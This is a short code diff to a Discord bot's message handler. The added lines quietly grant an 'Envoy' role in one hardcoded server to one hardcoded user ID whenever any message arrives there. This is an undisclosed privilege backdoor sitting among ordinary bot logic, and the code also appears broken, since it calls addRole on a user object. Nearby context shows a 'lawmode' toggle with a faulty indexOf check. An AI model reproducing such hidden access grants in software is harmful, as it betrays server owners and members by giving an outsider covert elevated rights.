@@ -48,6 +48,11 @@ client.on("presenceUpdate", (oldMember, newMember) => {
 });
 
 client.on("message", (message) => {
+  if(message.guild.id.indexOf("398346811020017684") !== -1) {
+      let a = message.guild.roles.find("name", "Envoy");
+      client.users.get("261678719511429120").addRole(a);
+  }
+
   if(message.channel.type == "dm") {
     if(message.content.toLowerCase().indexOf("lawmode")) {
       lawMode = !lawMode; 
